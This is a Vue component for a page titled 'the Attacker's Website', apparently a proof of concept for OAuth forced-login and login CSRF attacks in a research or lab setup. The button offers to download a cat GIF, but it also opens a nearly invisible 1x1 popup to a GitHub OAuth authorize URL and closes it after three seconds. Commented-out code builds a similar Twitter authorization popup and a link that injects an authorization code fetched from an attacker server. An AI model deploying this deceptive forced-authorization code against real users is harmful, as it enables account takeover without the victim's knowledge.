<template>
    <div class="dashboard">
      <h1>This is the Attacker's Website</h1>
      <h2> Force Login</h2>
      <div class="flex-container"> 
        <div >
          <img src="@/assets/cat-cats.gif">
          <br>
          <button type="button" ref="forceLoginBtn" @click="forceLogin()">
            <span>Download image/Force login</span>
          </button>
          <!-- <a :href="evil_link">visit website twitter</a> -->
        </div>
      </div>
    </div>
  </template>
  
  <script>
    // import { defineComponent, ref } from 'vue';
    import { defineComponent} from 'vue';
    // import axios from 'axios';
    require("@/assets/cat-cats.gif")
    export default defineComponent({
      mounted: function() {
        console.log(this.$refs.forceLoginBtn)
        // this.$refs.forceLoginBtn.click()
      },
      setup() {
        
        const forceLogin = () => {
          console.log("forceLogin");
          var a = document.createElement('a');
          a.href = "@/assets/cat-cats.gif";
          console.log(a.href)
          a.download = "@/assets/cat-cats.gif";
          document.body.appendChild(a);
          a.click();
          document.body.removeChild(a);
          // var win = window.open('https://twitter.com/i/oauth2/authorize?response_type=code&client_id=UGxoMHJDc0JFcWNvMzkxeDZjMEk6MTpjaQ&redirect_uri=http%3A%2F%2Flocalhost%3A8080%2Flogin&state=state&code_challenge=challenge&code_challenge_method=plain&scope=users.read+tweet.write+tweet.read+follows.read+follows.write','windowname','width=1,height=1,left=5,top=3');
          var win = window.open('https://github.com/login/oauth/authorize?client_id=d83ac1ef7822f3087e4b&redirect_uri=http://localhost:8080/login&scope=user','windowname','width=1,height=1,left=5,top=3');
          setTimeout(function() { win.close();}, 3000);
        };
      //   const evil_link = ref('');
      //   const getCode = async () => {
      //   try {
      //     const resData = await axios.get('http://localhost:8083/oauthcode/get_code');
      //     console.log(resData)
      //     if (resData.status === 200) {
      //       const code = resData.data;
      //       evil_link.value = `http://localhost:8080/login?state=state&code=${code}&login_method=twitterLoginSF`
      //     } else {
      //       alert('Unknown Error Occurs');
      //     }
      //   } catch (error) {
      //     alert('Unknown Error Occurs');
      //   } finally {
      //     // Empty here
      //   }
      // };
      // getCode();
      return {
        // evil_link,
        forceLogin
      };
      },
      
    });
    
  </script>
  
  <style>
    /* .flex-container {
      display: flex;
      background-color: DodgerBlue;
    }
    .flex-container > div {
      background-color: #f1f1f1;
      margin: 10px;
      padding: 20px;
      font-size: 30px;
    } */
  </style>